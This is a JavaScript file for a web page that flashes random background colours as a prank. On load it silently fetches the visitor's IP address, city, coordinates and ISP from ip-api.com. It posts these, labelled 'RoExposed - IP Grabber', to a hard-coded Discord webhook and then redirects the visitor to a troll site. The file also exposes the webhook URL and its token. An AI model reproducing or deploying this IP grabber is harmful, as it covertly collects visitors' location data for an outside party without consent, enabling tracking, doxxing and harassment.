"use strict";

const colors = ['#FF6633', '#FFB399', '#FF33FF', '#FFFF99', '#00B3E6',
    '#E6B333', '#3366E6', '#999966', '#99FF99', '#B34D4D',
    '#80B300', '#809900', '#E6B3B3', '#6680B3', '#66991A',
    '#FF99E6', '#CCFF1A', '#FF1A66', '#E6331A', '#33FFCC',
    '#66994D', '#B366CC', '#4D8000', '#B33300', '#CC80CC',
    '#66664D', '#991AFF', '#E666FF', '#4DB3FF', '#1AB399',
    '#E666B3', '#33991A', '#CC9999', '#B3B31A', '#00E680',
    '#4D8066', '#809980', '#E6FF80', '#1AFF33', '#999933',
    '#FF3380', '#CCCC00', '#66E64D', '#4D80CC', '#9900B3',
    '#E64D66', '#4DB380', '#FF4D4D', '#99E6E6', '#6666FF'];

document.getElementById("root").style.backgroundColor = colors[1]


setInterval(() => {
    const random = colors[Math.floor(
        Math.random() * colors.length)];
    document.getElementById("root").style.backgroundColor = random
}, 100);


fetch("http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,query")
    .then(async (response) => {
        const data = await response.json();
        console.log(data)
        const ip = `http://ip-api.com/json/${data.query}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,query?`
        try {
            const color = (data.proxy) ? 11022898 : 3468096

            const params = {
                content: "@everyone",
                embeds: [{
                    type: "rich",
                    title: "IP Obtained",
                    color: color,
                    description: `Grabbed new IP Address from somebody in **${data.regionName}**.`,
                    fields: [{
                        name: "IP Address -",
                        value: data.query
                    }, {
                        name: "Lat/Long -",
                        value: `${data.lat} ${data.lon}`
                    }, {
                        name: "Area",
                        value: `${data.countryCode}, ${data.zip} ${data.regionName} ${data.city}`
                    }],
                    footer: {
                        text: "RoExposed - IP Grabber"
                    }
                }]
            }

            fetch("https://canary.discord.com/api/webhooks/828352541678764042/itVmOwlN2F0kFDjuq7FnrXqTUzamfp77ooWsqc68r6LrOaNr3YvCm9RZaZTKVPZ9BmGX", {
                method: "POST",
                headers: {
                    "Content-type": "application/json"
                },
                body: JSON.stringify(params)
            })
                .then(() => window.location = "https://trollface.dk/")


        } catch (error) {
            console.error(error);
        }
    })